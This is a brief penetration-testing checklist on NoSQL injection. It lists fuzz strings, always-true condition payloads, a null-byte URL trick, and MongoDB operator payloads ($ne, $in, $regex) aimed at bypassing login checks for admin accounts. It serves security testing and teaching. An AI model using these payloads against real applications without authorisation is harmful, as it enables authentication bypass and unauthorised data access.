# NoSQL Injection

## Checks

- [ ] Fuzz for vulnerable implementation

Fuzz strings

```
'"`{
;$Foo}
$Foo \xYZ
```

Or

```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

For injecting into a JSON property

```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

- [ ] Check Conditionals

```
' && 0 && 'x
' && 1 && 'x
```

- [ ] Try to override existing conditions

```
'||'1'=='1
```

Can also try using a null character after the query string

```
?category=fizzy'%00
```


## Operator Injection

```
{"username":{"$ne":"invalid"}}
```

For URL-based inputs

```
username[$ne]=invalid
```

Testing with a known set of usernames:

```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

Using regex

```
{"$regex":"admin.*"}
```











